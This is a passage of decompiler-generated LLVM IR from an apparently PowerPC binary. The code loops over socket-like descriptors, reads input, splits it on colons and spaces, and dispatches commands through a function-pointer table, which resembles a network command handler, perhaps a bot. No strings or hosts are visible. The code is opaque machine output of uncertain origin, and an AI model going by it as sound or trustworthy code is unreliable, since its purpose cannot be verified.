  store i32 ptrtoint ([6 x i8]* @global_var_1000dce0.175 to i32), i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_10004120.176 to i32), i32* @lr, align 4
  %v4_1000411c = call i32 @function_10007064(i32 %v2_100040f4, i32 ptrtoint ([6 x i8]* @global_var_1000dce0.175 to i32), i32 %v0_10004104)
  %v2_1000418c48 = icmp sgt i32 %arg1, 1
  br i1 %v2_1000418c48, label %dec_label_pc_1000412c, label %dec_label_pc_10004194

dec_label_pc_1000412c:                            ; preds = %dec_label_pc_100040f0, %dec_label_pc_1000412c
  %storemerge1051 = phi i32 [ %v1_1000417c, %dec_label_pc_1000412c ], [ 1, %dec_label_pc_100040f0 ]
  %v1_10004130 = mul i32 %storemerge1051, 4
  %v2_1000413c = add i32 %v1_10004130, %tmp
  %v1_10004140 = inttoptr i32 %v2_1000413c to i32*
  %v2_10004140 = load i32, i32* %v1_10004140, align 4
  store i32 %v2_10004140, i32* @r3, align 4
  %v0_10004160 = call i32 @function_10006ed4()
  store i32 268452216, i32* @lr, align 4
  %v3_10004174 = call i32 @function_10006e24(i32 %v2_10004140, i32 0, i32 %v0_10004160)
  %v1_1000417c = add nuw nsw i32 %storemerge1051, 1
  %v2_1000418c = icmp slt i32 %v1_1000417c, %arg1
  br i1 %v2_1000418c, label %dec_label_pc_1000412c, label %dec_label_pc_10004194

dec_label_pc_10004194:                            ; preds = %dec_label_pc_1000412c, %dec_label_pc_100040f0
  store i32 268452252, i32* @lr, align 4
  %v1_10004198 = call i32 @function_10004a90(i32 0)
  store i32 268452260, i32* @lr, align 4
  %v0_100041a0 = call i32 @function_10004970()
  %v2_100041a8 = xor i32 %v1_10004198, %v0_100041a0
  store i32 268452272, i32* @lr, align 4
  %v0_100041ac = call i32 @function_100049b8()
  %v2_100041b4 = add i32 %v2_100041a8, %v0_100041ac
  store i32 268452288, i32* @lr, align 4
  %v1_100041bc = call i32 @function_100082d4(i32 %v2_100041b4)
  store i32 268452292, i32* @lr, align 4
  %v0_100041c0 = call i32 @function_100007d4()
  store i32 %v0_100041c0, i32* @global_var_10010474.145, align 4
  store i32 268452308, i32* @lr, align 4
  %v0_100041d0 = call i32 @function_100007d4()
  store i32 %v0_100041d0, i32* @global_var_10010470.19, align 4
  store i32 268452324, i32* @lr, align 4
  %v0_100041e0 = call i32 @function_100007d4()
  store i32 %v0_100041e0, i32* @global_var_1001047c.177, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1000dce8.178 to i32), i32* @global_var_10010488.143, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1000dcf0.179 to i32), i32* @global_var_10010484.159, align 4
  store i32 0, i32* @global_var_10010480.106, align 4
  %v2_10004268 = ptrtoint i32* %stack_var_-6308 to i32
  %v2_100042c0 = ptrtoint i32* %stack_var_-6616 to i32
  %v2_100042c4 = add i32 %v2_100042c0, 308
  %v2_1000431c = ptrtoint i32* %stack_var_-6316 to i32
  %v2_10004530 = ptrtoint i32* %stack_var_-4132 to i32
  %v2_1000461c = ptrtoint i32* %stack_var_-5156 to i32
  %v2_100046c4 = ptrtoint i32* %stack_var_-6180 to i32
  %v2_10004564 = add i32 %v2_100042c0, 2484
  br label %dec_label_pc_10004220

dec_label_pc_10004220:                            ; preds = %dec_label_pc_10004528, %dec_label_pc_100042ac, %dec_label_pc_1000479c, %dec_label_pc_10004194
  store i32 268452388, i32* @lr, align 4
  %v0_10004220 = call i32 @function_10003dbc()
  %v3_10004228 = load i32, i32* @global_var_10010478.10, align 4
  %v3_10004230 = load i32, i32* @global_var_10010474.145, align 4
  %v3_10004238 = load i32, i32* @global_var_10010470.19, align 4
  %v7_10004260 = call i32 @function_1000041c(i32 %v3_10004228, i32 ptrtoint ([41 x i8]* @global_var_1000dcf8.180 to i32), i32 %v3_10004230, i32 %v3_10004238)
  br label %dec_label_pc_10004268

dec_label_pc_10004268:                            ; preds = %dec_label_pc_100044e8, %dec_label_pc_1000455c, %dec_label_pc_100047bc, %dec_label_pc_100047e0, %dec_label_pc_10004220
  br label %dec_label_pc_1000427c

dec_label_pc_1000427c:                            ; preds = %dec_label_pc_10004268, %dec_label_pc_1000427c
  %storemerge1123 = phi i32 [ 0, %dec_label_pc_10004268 ], [ %v1_10004298, %dec_label_pc_1000427c ]
  %v1_10004284 = mul nuw nsw i32 %storemerge1123, 4
  %v2_10004288 = add i32 %v1_10004284, %v2_10004268
  %v2_10004290 = inttoptr i32 %v2_10004288 to i32*
  store i32 0, i32* %v2_10004290, align 4
  %v1_10004298 = add nuw nsw i32 %storemerge1123, 1
  %tmp73 = icmp ult i32 %v1_10004298, 32
  br i1 %tmp73, label %dec_label_pc_1000427c, label %dec_label_pc_100042ac

dec_label_pc_100042ac:                            ; preds = %dec_label_pc_1000427c
  %v3_100042b0 = load i32, i32* @global_var_10010478.10, align 4
  %v1_100042b4 = udiv i32 %v3_100042b0, 32
  %v1_100042bc = mul nuw nsw i32 %v1_100042b4, 4
  %v1_100042c8 = add i32 %v1_100042bc, %v2_100042c4
  %v1_100042cc = inttoptr i32 %v1_100042c8 to i32*
  %v2_100042cc = load i32, i32* %v1_100042cc, align 4
  %v1_100042d8 = urem i32 %v3_100042b0, 32
  %v3_100042e0 = shl i32 1, %v1_100042d8
  %v2_100042e4 = or i32 %v2_100042cc, %v3_100042e0
  store i32 %v2_100042e4, i32* %v1_100042cc, align 4
  store i32 1200, i32* %stack_var_-6316, align 4
  %v3_10004310 = load i32, i32* @global_var_10010478.10, align 4
  %v1_10004314 = add i32 %v3_10004310, 1
  store i32 268452664, i32* @lr, align 4
  %v6_10004334 = call i32 @function_10004a48(i32 %v1_10004314, i32 %v2_10004268, i32 0, i32 0, i32 %v2_1000431c, i32 %v2_10004268)
  %tmp74 = icmp slt i32 %v6_10004334, 1
  br i1 %tmp74, label %dec_label_pc_10004220, label %dec_label_pc_100044d4.preheader

dec_label_pc_100044d4.preheader:                  ; preds = %dec_label_pc_100042ac
  %v3_100044d828 = load i32, i32* @global_var_10010468.13, align 4
  %v2_100044e029 = icmp eq i32 %v3_100044d828, 0
  br i1 %v2_100044e029, label %dec_label_pc_100044e8, label %dec_label_pc_10004350

dec_label_pc_10004350:                            ; preds = %dec_label_pc_100044d4.preheader, %dec_label_pc_100044c8
  %storemerge1231 = phi i32 [ %.pre, %dec_label_pc_100044c8 ], [ 0, %dec_label_pc_100044d4.preheader ]
  %v1_10004354 = mul i32 %storemerge1231, 4
  %v3_10004360 = load i32, i32* @global_var_1001048c.14, align 4
  %v2_10004364 = add i32 %v3_10004360, %v1_10004354
  %v1_10004368 = inttoptr i32 %v2_10004364 to i32*
  %v2_10004368 = load i32, i32* %v1_10004368, align 4
  store i32 268452732, i32* @lr, align 4
  %v3_10004378 = call i32 @function_10004ad8(i32 %v2_10004368, i32 0, i32 1)
  %tmp75 = icmp slt i32 %v3_10004378, 1
  %.pre = add i32 %storemerge1231, 1
  br i1 %tmp75, label %dec_label_pc_100044c8, label %dec_label_pc_100043e0.preheader

dec_label_pc_100043e0.preheader:                  ; preds = %dec_label_pc_10004350
  %v3_100043e479 = load i32, i32* @global_var_10010468.13, align 4
  %v2_100043ec80 = icmp ult i32 %.pre, %v3_100043e479
  %v1_1000439c81 = mul i32 %.pre, 4
  %v3_100043a882 = load i32, i32* @global_var_1001048c.14, align 4
  %v2_100043ac83 = add i32 %v3_100043a882, %v1_1000439c81
  br i1 %v2_100043ec80, label %dec_label_pc_10004398, label %dec_label_pc_100043f4

dec_label_pc_10004398:                            ; preds = %dec_label_pc_100043e0.preheader, %dec_label_pc_10004398
  %v2_100043ac87 = phi i32 [ %v2_100043ac, %dec_label_pc_10004398 ], [ %v2_100043ac83, %dec_label_pc_100043e0.preheader ]
  %v1_1000438c84 = phi i32 [ %v1_1000438c, %dec_label_pc_10004398 ], [ %.pre, %dec_label_pc_100043e0.preheader ]
  %v1_100043b0 = add i32 %v2_100043ac87, -4
  %v1_100043cc = inttoptr i32 %v2_100043ac87 to i32*
  %v2_100043cc = load i32, i32* %v1_100043cc, align 4
  %v2_100043d0 = inttoptr i32 %v1_100043b0 to i32*
  store i32 %v2_100043cc, i32* %v2_100043d0, align 4
  %v1_1000438c = add i32 %v1_1000438c84, 1
  %v3_100043e4 = load i32, i32* @global_var_10010468.13, align 4
  %v2_100043ec = icmp ult i32 %v1_1000438c, %v3_100043e4
  %v1_1000439c = mul i32 %v1_1000438c, 4
  %v3_100043a8 = load i32, i32* @global_var_1001048c.14, align 4
  %v2_100043ac = add i32 %v3_100043a8, %v1_1000439c
  br i1 %v2_100043ec, label %dec_label_pc_10004398, label %dec_label_pc_100043f4

dec_label_pc_100043f4:                            ; preds = %dec_label_pc_10004398, %dec_label_pc_100043e0.preheader
  %v2_100043ac.lcssa = phi i32 [ %v2_100043ac83, %dec_label_pc_100043e0.preheader ], [ %v2_100043ac, %dec_label_pc_10004398 ]
  %v1_1000440c = add i32 %v2_100043ac.lcssa, -4
  %v2_10004414 = inttoptr i32 %v1_1000440c to i32*
  store i32 0, i32* %v2_10004414, align 4
  %v3_1000441c = load i32, i32* @global_var_10010468.13, align 4
  %v1_10004420 = add i32 %v3_1000441c, -1
  store i32 %v1_10004420, i32* @global_var_10010468.13, align 4
  %v1_10004434 = mul i32 %v1_10004420, 4
  %v1_10004438 = add i32 %v1_10004434, 4
  store i32 268452932, i32* @lr, align 4
  %v1_10004440 = call i32 @function_10007cec(i32 %v1_10004438)
  %v3_1000449c24 = load i32, i32* @global_var_10010468.13, align 4
  %v2_100044a425 = icmp eq i32 %v3_1000449c24, 0
  br i1 %v2_100044a425, label %dec_label_pc_100044ac, label %dec_label_pc_10004458

dec_label_pc_10004458:                            ; preds = %dec_label_pc_100043f4, %dec_label_pc_10004458
  %storemerge1927 = phi i32 [ %v1_10004490, %dec_label_pc_10004458 ], [ 0, %dec_label_pc_100043f4 ]
  %v1_1000445c = mul i32 %storemerge1927, 4
  %v2_10004468 = add i32 %v1_1000445c, %v1_10004440
  %v3_1000447c = load i32, i32* @global_var_1001048c.14, align 4
  %v2_10004480 = add i32 %v3_1000447c, %v1_1000445c
  %v1_10004484 = inttoptr i32 %v2_10004480 to i32*
  %v2_10004484 = load i32, i32* %v1_10004484, align 4
  %v2_10004488 = inttoptr i32 %v2_10004468 to i32*
  store i32 %v2_10004484, i32* %v2_10004488, align 4
  %v1_10004490 = add i32 %storemerge1927, 1
  %v3_1000449c = load i32, i32* @global_var_10010468.13, align 4
  %v2_100044a4 = icmp ult i32 %v1_10004490, %v3_1000449c
  br i1 %v2_100044a4, label %dec_label_pc_10004458, label %dec_label_pc_10004498.dec_label_pc_100044ac_crit_edge

dec_label_pc_10004498.dec_label_pc_100044ac_crit_edge: ; preds = %dec_label_pc_10004458
  br label %dec_label_pc_100044ac

dec_label_pc_100044ac:                            ; preds = %dec_label_pc_100043f4, %dec_label_pc_10004498.dec_label_pc_100044ac_crit_edge
  %v3_100044b0 = load i32, i32* @global_var_1001048c.14, align 4
  store i32 268453052, i32* @lr, align 4
  %v1_100044b8 = call i32 @function_10007e44(i32 %v3_100044b0)
  store i32 %v1_10004440, i32* @global_var_1001048c.14, align 4
  br label %dec_label_pc_100044c8

dec_label_pc_100044c8:                            ; preds = %dec_label_pc_10004350, %dec_label_pc_100044ac
  %v3_100044d8 = load i32, i32* @global_var_10010468.13, align 4
  %v2_100044e0 = icmp ult i32 %.pre, %v3_100044d8
  br i1 %v2_100044e0, label %dec_label_pc_10004350, label %dec_label_pc_100044e8

dec_label_pc_100044e8:                            ; preds = %dec_label_pc_100044d4.preheader, %dec_label_pc_100044c8
  %v3_100044ec = load i32, i32* @global_var_10010478.10, align 4
  %v1_100044f0 = udiv i32 %v3_100044ec, 32
  %v1_100044f4 = mul nuw nsw i32 %v1_100044f0, 4
  %v1_10004500 = add i32 %v1_100044f4, %v2_100042c4
  %v1_10004504 = inttoptr i32 %v1_10004500 to i32*
  %v2_10004504 = load i32, i32* %v1_10004504, align 4
  %v1_10004510 = urem i32 %v3_100044ec, 32
  %v3_10004514 = sub i32 0, %v3_100044ec
  %v4_10004514 = urem i32 %v3_10004514, 32
  %v5_10004514 = shl i32 %v2_10004504, %v4_10004514
  %v6_10004514 = xor i32 %v4_10004514, 31
  %v7_10004514 = lshr i32 %v2_10004504, %v6_10004514
  %v8_10004514 = udiv i32 %v7_10004514, 2
  %v9_10004514 = or i32 %v8_10004514, %v5_10004514
  %v12_10004514 = lshr i32 -1, %v1_10004510
  %tmp100 = icmp slt i32 %v2_10004504, 0
  %v15_1000451420 = zext i1 %tmp100 to i32
  %v16_10004514 = xor i32 %v12_10004514, 1
  %v17_10004514 = and i32 %v15_1000451420, %v16_10004514
  %v14_10004514 = urem i32 %v12_10004514, 2
  %v14_10004514.masked = and i32 %v14_10004514, %v9_10004514
  %v1_1000451c = or i32 %v14_10004514.masked, %v17_10004514
  %v3_10004520 = icmp eq i32 %v1_1000451c, 0
  br i1 %v3_10004520, label %dec_label_pc_10004268, label %dec_label_pc_10004528

dec_label_pc_10004528:                            ; preds = %dec_label_pc_100044e8
  store i32 268453192, i32* @lr, align 4
  %v4_10004544 = call i32 @function_10007c04(i32 %v3_100044ec, i32 %v2_10004530, i32 4096, i32 0)
  store i32 %v4_10004544, i32* %stack_var_-6616, align 4
  %tmp76 = icmp slt i32 %v4_10004544, 1
  br i1 %tmp76, label %dec_label_pc_10004220, label %dec_label_pc_1000455c

dec_label_pc_1000455c:                            ; preds = %dec_label_pc_10004528
  %v3_1000456c = add i32 %v2_10004564, %v4_10004544
  %v4_1000456c = inttoptr i32 %v3_1000456c to i8*
  store i8 0, i8* %v4_1000456c, align 1
  store i32 ptrtoint (i32* @global_var_1000dd24.182 to i32), i32* @r4, align 4
  store i32 268453252, i32* @lr, align 4
  %v3_10004580 = call i32 @function_100073fc(i32 %v2_10004530, i32 ptrtoint (i32* @global_var_1000dd24.182 to i32), i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v3_100047d845 = icmp eq i32 %v3_10004580, 0
  br i1 %v3_100047d845, label %dec_label_pc_10004268, label %dec_label_pc_100047e0

dec_label_pc_10004590:                            ; preds = %dec_label_pc_100047e0
  store i32 268453272, i32* @lr, align 4
  %v2_10004594 = call i32 @function_10000724(i32 %storemerge47.in)
  %v2_1000459c = load i8, i8* %storemerge47, align 1
  %v3_100045a4 = icmp eq i8 %v2_1000459c, 58
  br i1 %v3_100045a4, label %dec_label_pc_100045c4.preheader, label %dec_label_pc_10004650

dec_label_pc_100045c4.preheader:                  ; preds = %dec_label_pc_10004590
  store i32 0, i32* %stack_var_-6616, align 4
  store i32 %storemerge47.in, i32* @r3, align 4
  %v0_100045cc32 = call i32 @function_10006ed4()
  %v2_100045d434 = icmp eq i32 %v0_100045cc32, 0
  br i1 %v2_100045d434, label %dec_label_pc_100045fc, label %dec_label_pc_100045dc

dec_label_pc_100045b8:                            ; preds = %dec_label_pc_100045dc
  %v1_100045bc = add i32 %v3_100045dc, 1
  store i32 %v1_100045bc, i32* %stack_var_-6616, align 4
  store i32 %storemerge47.in, i32* @r3, align 4
  %v0_100045cc = call i32 @function_10006ed4()
  %v2_100045d4 = icmp ult i32 %v1_100045bc, %v0_100045cc
  br i1 %v2_100045d4, label %dec_label_pc_100045dc, label %dec_label_pc_100045fc

dec_label_pc_100045dc:                            ; preds = %dec_label_pc_100045c4.preheader, %dec_label_pc_100045b8
  %v3_100045dc = load i32, i32* %stack_var_-6616, align 4
  %v2_100045e8 = add i32 %v3_100045dc, %storemerge47.in
  %v1_100045ec = inttoptr i32 %v2_100045e8 to i8*
  %v2_100045ec = load i8, i8* %v1_100045ec, align 1
  %v3_100045f4 = icmp eq i8 %v2_100045ec, 32
  br i1 %v3_100045f4, label %dec_label_pc_100045fc, label %dec_label_pc_100045b8

dec_label_pc_100045fc:                            ; preds = %dec_label_pc_100045c4.preheader, %dec_label_pc_100045b8, %dec_label_pc_100045dc
  %v3_100045fc = load i32, i32* %stack_var_-6616, align 4
  %v2_10004608 = add i32 %v3_100045fc, %storemerge47.in
  %v3_10004610 = inttoptr i32 %v2_10004608 to i8*
  store i8 0, i8* %v3_10004610, align 1
  %v1_10004618 = add i32 %storemerge47.in, 1
  %v2_10004628 = inttoptr i32 %v1_10004618 to i8*
  %v3_10004628 = call i32 @function_10006eb4(i32 %v2_1000461c, i8* %v2_10004628)
  %v3_1000462c = load i32, i32* %stack_var_-6616, align 4
  %v2_10004638 = add i32 %v3_1000462c, %storemerge47.in
  %v1_1000463c = add i32 %v2_10004638, 1
  %v3_10004648 = inttoptr i32 %v1_1000463c to i8*
  %v4_10004648 = call i32 @function_10006eb4(i32 %storemerge47.in, i8* %v3_10004648)
  br label %dec_label_pc_10004674.preheader

dec_label_pc_10004650:                            ; preds = %dec_label_pc_10004590
  store i32 10752, i32* %stack_var_-5156, align 4
  br label %dec_label_pc_10004674.preheader

dec_label_pc_10004674.preheader:                  ; preds = %dec_label_pc_100045fc, %dec_label_pc_10004650
  store i32 0, i32* %stack_var_-6616, align 4
  store i32 %storemerge47.in, i32* @r3, align 4
  %v0_1000467c37 = call i32 @function_10006ed4()
  %v2_1000468439 = icmp eq i32 %v0_1000467c37, 0
  br i1 %v2_1000468439, label %dec_label_pc_100046ac, label %dec_label_pc_1000468c

dec_label_pc_10004668:                            ; preds = %dec_label_pc_1000468c
  %v1_1000466c = add i32 %v3_1000468c, 1
  store i32 %v1_1000466c, i32* %stack_var_-6616, align 4
  store i32 %storemerge47.in, i32* @r3, align 4
  %v0_1000467c = call i32 @function_10006ed4()
  %v2_10004684 = icmp ult i32 %v1_1000466c, %v0_1000467c
  br i1 %v2_10004684, label %dec_label_pc_1000468c, label %dec_label_pc_100046ac

dec_label_pc_1000468c:                            ; preds = %dec_label_pc_10004674.preheader, %dec_label_pc_10004668
  %v3_1000468c = load i32, i32* %stack_var_-6616, align 4
  %v2_10004698 = add i32 %v3_1000468c, %storemerge47.in
  %v1_1000469c = inttoptr i32 %v2_10004698 to i8*
  %v2_1000469c = load i8, i8* %v1_1000469c, align 1
  %v3_100046a4 = icmp eq i8 %v2_1000469c, 32
  br i1 %v3_100046a4, label %dec_label_pc_100046ac, label %dec_label_pc_10004668

dec_label_pc_100046ac:                            ; preds = %dec_label_pc_10004674.preheader, %dec_label_pc_10004668, %dec_label_pc_1000468c
  %v3_100046ac = load i32, i32* %stack_var_-6616, align 4
  %v2_100046b8 = add i32 %v3_100046ac, %storemerge47.in
  %v3_100046c0 = inttoptr i32 %v2_100046b8 to i8*
  store i8 0, i8* %v3_100046c0, align 1
  %v4_100046d0 = call i32 @function_10006eb4(i32 %v2_100046c4, i8* %storemerge47)
  %v3_100046d4 = load i32, i32* %stack_var_-6616, align 4
  %v2_100046e0 = add i32 %v3_100046d4, %storemerge47.in
  %v1_100046e4 = add i32 %v2_100046e0, 1
  %v3_100046f0 = inttoptr i32 %v1_100046e4 to i8*
  %v4_100046f0 = call i32 @function_10006eb4(i32 %storemerge47.in, i8* %v3_100046f0)
  store i32 0, i32* %stack_var_-6616, align 4
  %v2_1000479090 = load i32, i32* bitcast ([4 x i8]** @global_var_100100a4.186 to i32*), align 4
  %v3_1000479493 = icmp eq i32 %v2_1000479090, 0
  br i1 %v3_1000479493, label %dec_label_pc_1000479c, label %dec_label_pc_10004700

dec_label_pc_10004700:                            ; preds = %dec_label_pc_100046ac, %dec_label_pc_10004700
  %v1_1000479096 = phi i32* [ %v1_10004790, %dec_label_pc_10004700 ], [ bitcast ([4 x i8]** @global_var_100100a4.186 to i32*), %dec_label_pc_100046ac ]
  %v2_10004714 = load i32, i32* %v1_1000479096, align 4
  store i32 %v2_10004714, i32* @r3, align 4
  store i32 %v2_100046c4, i32* @r4, align 4
  %v2_10004724 = call i32 @function_1000735c(i32 %v2_10004714, i32 %v2_100046c4)
  %v3_10004734 = load i32, i32* %stack_var_-6616, align 4
  %v1_10004740 = mul i32 %v3_10004734, 8
  %v1_10004748 = add i32 %v1_10004740, add (i32 ptrtoint ([4 x i8]** @global_var_100100a4.186 to i32), i32 4)
  %v1_1000474c = inttoptr i32 %v1_10004748 to i32*
  %v2_1000474c = load i32, i32* %v1_1000474c, align 4
  call void @__pseudo_call(i32 %v2_1000474c)
  %v3_10004770 = load i32, i32* %stack_var_-6616, align 4
  %v1_10004774 = add i32 %v3_10004770, 1
  store i32 %v1_10004774, i32* %stack_var_-6616, align 4
  %v1_10004788 = mul i32 %v1_10004774, 8
  %v2_1000478c = add i32 %v1_10004788, ptrtoint ([4 x i8]** @global_var_100100a4.186 to i32)
  %v1_10004790 = inttoptr i32 %v2_1000478c to i32*
  %v2_10004790 = load i32, i32* %v1_10004790, align 4
  %v3_10004794 = icmp eq i32 %v2_10004790, 0
  br i1 %v3_10004794, label %dec_label_pc_1000479c, label %dec_label_pc_10004700

dec_label_pc_1000479c:                            ; preds = %dec_label_pc_10004700, %dec_label_pc_100046ac
  store i32 %v2_100046c4, i32* @r3, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1000dd28.187 to i32), i32* @r4, align 4
  %v3_100047ac = call i32 @function_1000735c(i32 %v2_100046c4, i32 ptrtoint ([6 x i8]* @global_var_1000dd28.187 to i32))
  %v3_100047b4 = icmp eq i32 %v3_100047ac, 0
  br i1 %v3_100047b4, label %dec_label_pc_10004220, label %dec_label_pc_100047bc

dec_label_pc_100047bc:                            ; preds = %dec_label_pc_1000479c
  store i32 ptrtoint (i32* @global_var_1000dd24.182 to i32), i32* @r4, align 4
  store i32 268453836, i32* @lr, align 4
  %v3_100047c8 = call i32 @function_100073fc(i32 0, i32 ptrtoint (i32* @global_var_1000dd24.182 to i32), i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v3_100047d8 = icmp eq i32 %v3_100047c8, 0
  br i1 %v3_100047d8, label %dec_label_pc_10004268, label %dec_label_pc_100047e0

dec_label_pc_100047e0:                            ; preds = %dec_label_pc_1000455c, %dec_label_pc_100047bc
  %storemerge47.in = phi i32 [ %v3_100047c8, %dec_label_pc_100047bc ], [ %v3_10004580, %dec_label_pc_1000455c ]
  %storemerge47 = inttoptr i32 %storemerge47.in to i8*
  %v2_100047e4 = load i8, i8* %storemerge47, align 1
  %v3_100047ec = icmp eq i8 %v2_100047e4, 0
  br i1 %v3_100047ec, label %dec_label_pc_10004268, label %dec_label_pc_10004590

; uselistorder directives
  uselistorder i8* %storemerge47, { 2, 1, 0 }
  uselistorder i32 %storemerge47.in, { 14, 13, 7, 10, 5, 4, 9, 3, 8, 6, 12, 2, 1, 0, 11 }
  uselistorder i32* %v1_10004790, { 1, 0 }
  uselistorder i32 %v4_10004514, { 1, 0 }
  uselistorder i32 %v2_10004504, { 0, 2, 1 }
  uselistorder i32 %v3_100044ec, { 2, 3, 1, 0 }
  uselistorder i32 %v1_10004490, { 1, 0 }
  uselistorder i32 %v1_1000445c, { 1, 0 }
  uselistorder i32 %storemerge1927, { 1, 0 }
  uselistorder i32 %v1_10004440, { 1, 0 }
  uselistorder i32 %v1_1000438c, { 0, 2, 1 }
  uselistorder i32 %v2_100043ac87, { 1, 0 }
  uselistorder i32 %.pre, { 2, 4, 0, 3, 1 }
  uselistorder i32 %storemerge1231, { 1, 0 }
  uselistorder i32 %v3_100042b0, { 1, 0 }
  uselistorder i32 %storemerge1123, { 1, 0 }
  uselistorder i32 %v2_100046c4, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_10004268, { 2, 1, 0 }
  uselistorder i32 %v1_1000417c, { 1, 0 }
  uselistorder i32 %v2_10004140, { 1, 0 }
  uselistorder i32 %storemerge1051, { 1, 0 }
  uselistorder i32* %stack_var_-6616, { 5, 6, 7, 0, 8, 9, 10, 4, 1, 11, 12, 13, 3, 2, 14, 15 }
  uselistorder i32 ptrtoint ([4 x i8]** @global_var_100100a4.186 to i32), { 1, 0 }
  uselistorder [4 x i8]** @global_var_100100a4.186, { 1, 0 }
  uselistorder i32 (i32)* @function_10000724, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1000dd24.182 to i32), { 0, 2, 1, 3 }
  uselistorder i32* @global_var_1001048c.14, { 1, 2, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder i32* @global_var_10010468.13, { 4, 5, 2, 6, 7, 8, 0, 1, 9, 3, 10, 11 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @function_10004a48, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_1000041c, { 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 1, 0, 10, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 ()* @function_100007d4, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_100082d4, { 1, 0 }
  uselistorder i32 (i32)* @function_10004a90, { 10, 9, 0, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 ()* @function_10004928, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_100047e0, { 1, 0 }
  uselistorder label %dec_label_pc_10004700, { 1, 0 }
  uselistorder label %dec_label_pc_100046ac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000468c, { 1, 0 }
  uselistorder label %dec_label_pc_10004674.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_100045fc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100045dc, { 1, 0 }
  uselistorder label %dec_label_pc_100044e8, { 1, 0 }
  uselistorder label %dec_label_pc_100044c8, { 1, 0 }
  uselistorder label %dec_label_pc_100044ac, { 1, 0 }
  uselistorder label %dec_label_pc_10004458, { 1, 0 }
  uselistorder label %dec_label_pc_10004398, { 1, 0 }
  uselistorder label %dec_label_pc_10004350, { 1, 0 }
  uselistorder label %dec_label_pc_1000427c, { 1, 0 }
  uselistorder label %dec_label_pc_10004268, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_10004220, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1000412c, { 1, 0 }
  uselistorder label %dec_label_pc_100040f0, { 1, 0 }
}

define i32 @function_100047f8(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_100047f8:
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* @r3, align 4
  %stack_var_-32 = alloca i32, align 4
  %v4_1000481c = icmp eq i32 %arg2, -2143521772
  %v2_10004820 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_10004820, i32* %stack_var_-32, align 4
  br i1 %v4_1000481c, label %dec_label_pc_1000487c, label %dec_label_pc_1000483c

dec_label_pc_1000483c:                            ; preds = %dec_label_pc_100047f8
  %v3_1000483c = icmp ugt i32 %arg2, -2143521772
  br i1 %v3_1000483c, label %dec_label_pc_10004854, label %dec_label_pc_10004844

dec_label_pc_10004844:                            ; preds = %dec_label_pc_1000483c
  %v3_10004848 = icmp eq i32 %arg2, 1077703699
  br i1 %v3_10004848, label %dec_label_pc_10004870, label %dec_label_pc_1000489c

dec_label_pc_10004854:                            ; preds = %dec_label_pc_1000483c
  %v1_10004854 = xor i32 %arg2, -2143551488
  %v3_10004858 = icmp eq i32 %v1_10004854, 29717
  br i1 %v3_10004858, label %dec_label_pc_1000488c, label %dec_label_pc_10004860

dec_label_pc_10004860:                            ; preds = %dec_label_pc_10004854
  %v3_10004864 = icmp eq i32 %v1_10004854, 29718
  br i1 %v3_10004864, label %dec_label_pc_10004894, label %dec_label_pc_1000489c

dec_label_pc_10004870:                            ; preds = %dec_label_pc_10004844
  store i32 ptrtoint (i32* @global_var_10004878.188 to i32), i32* @lr, align 4
  %v1_10004874 = inttoptr i32 %arg3 to i32*
  %v2_10004874 = call i32 @function_10007434(i32* %v1_10004874)
  br label %dec_label_pc_10004884

dec_label_pc_1000487c:                            ; preds = %dec_label_pc_100047f8
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_10004880

dec_label_pc_10004880:                            ; preds = %dec_label_pc_10004894, %dec_label_pc_1000488c, %dec_label_pc_1000487c
  store i32 268454020, i32* @lr, align 4
  %v0_10004880 = call i32 @function_100074d0()
  br label %dec_label_pc_10004884

dec_label_pc_10004884:                            ; preds = %dec_label_pc_10004870, %dec_label_pc_10004880
  %storemerge = phi i32 [ %v0_10004880, %dec_label_pc_10004880 ], [ %v2_10004874, %dec_label_pc_10004870 ]
  store i32 %storemerge, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100048c8

dec_label_pc_1000488c:                            ; preds = %dec_label_pc_10004854
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_10004880

dec_label_pc_10004894:                            ; preds = %dec_label_pc_10004860
  store i32 2, i32* @r4, align 4
  br label %dec_label_pc_10004880

dec_label_pc_1000489c:                            ; preds = %dec_label_pc_10004860, %dec_label_pc_10004844
  %v0_100048ac = call i32 @__asm_mfcr()
  %v1_100048b0 = and i32 %v0_100048ac, 268435456
  %v3_100048b0 = icmp eq i32 %v1_100048b0, 0
  store i32 %v0_100048ac, i32* %r31.global-to-local, align 4
  br i1 %v3_100048b0, label %dec_label_pc_100048c8, label %dec_label_pc_100048bc

dec_label_pc_100048bc:                            ; preds = %dec_label_pc_1000489c
  %v0_100048bc = call i32 @function_10004b48()
  %v0_100048c0 = load i32, i32* %r31.global-to-local, align 4
  %v2_100048c0 = inttoptr i32 %v0_100048bc to i32*
  store i32 %v0_100048c0, i32* %v2_100048c0, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100048c8

